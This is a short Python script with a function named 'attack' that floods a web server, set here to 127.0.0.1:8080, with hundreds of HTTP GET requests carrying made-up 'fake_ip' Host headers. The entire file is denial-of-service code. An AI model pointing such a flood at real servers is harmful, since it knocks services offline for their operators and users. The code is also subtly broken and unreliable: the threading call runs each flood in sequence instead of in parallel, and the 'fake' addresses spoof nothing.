import socket
import threading

target = '127.0.0.1'
port = 8080
count = 0


def attack(fake_ip):
    c = 0
    for n in range(500):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + "httpApp/" + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        # print(s.recv(4096))
        c = c + 1

        if c % 100 == 0:
            print('[' + str(100*((c // 100) % 5 + 1)) + '/500]')
        s.close()


for i in range(3):
    ip = '182.21.20.' + str(10 + i)
    thread = threading.Thread(target=attack(ip))
    thread.start()
    count = count + 500
    print('Number of requests: ' + str(count))
